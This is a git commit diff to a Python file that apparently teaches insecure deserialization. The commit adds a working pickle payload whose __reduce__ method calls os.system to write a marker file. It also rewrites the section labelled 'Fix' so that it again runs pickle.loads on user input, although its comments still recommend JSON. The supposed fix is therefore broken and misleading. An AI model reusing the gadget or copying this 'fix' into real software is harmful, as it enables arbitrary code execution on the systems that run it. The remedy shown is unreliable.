9f8bc70354c63b72000cdfdb9ac1f8c55a08c9ec
joyo8oyo <umarfendi@gmail.com>
2025-04-29 22:09:40 +0700

    Update vuln4-Insecure Deserialization.py

--- vuln4-Insecure Deserialization.py
+++ vuln4-Insecure Deserialization.py
@@ -1,15 +1,14 @@
 # Vulnerability 4: Insecure Deserialization
 # Vulnerable code
 import pickle
+import os
 
-try:
-    data = input("Enter pickled data: ")
-except EOFError:
-    print("Error: No input provided for pickled data.")
-    data = ""  # Set a default value
-untrusted_data = pickle.loads(data)
-print(untrusted_data)
+class Evil:
+    def __reduce__(self):
+        return (os.system, ("echo HACKED > C:\\Windows\\Temp\\pwned.txt",))
 
+malicious = pickle.dumps(Evil())
+print(repr(malicious))
 # Explanation:
 # Deserializing untrusted data with pickle can execute arbitrary code.
 # An attacker could provide a pickled object that, when loaded, executes malicious code via methods like __reduce__.
@@ -17,14 +16,17 @@ print(untrusted_data)
 # Fix:
 # Avoid deserializing untrusted data with pickle.
 # If you must deserialize, use a safe format like JSON.
-import json
+import pickle
+import ast  # <-- add this line
 
 try:
-    data = input("Enter JSON data: ")
+    data = input("Enter pickled data: ")
 except EOFError:
-    print("Error: No input provided for JSON data.")
-    data = "{}"  # Set a default value
-untrusted_data = json.loads(data)
+    print("Error: No input provided for pickled data.")
+    data = ""  # Set a default value
+data = ast.literal_eval(data)  # <-- add this line
+untrusted_data = pickle.loads(data)
 print(untrusted_data)
+
 
 # JSON is safer because it doesn't allow arbitrary code execution.
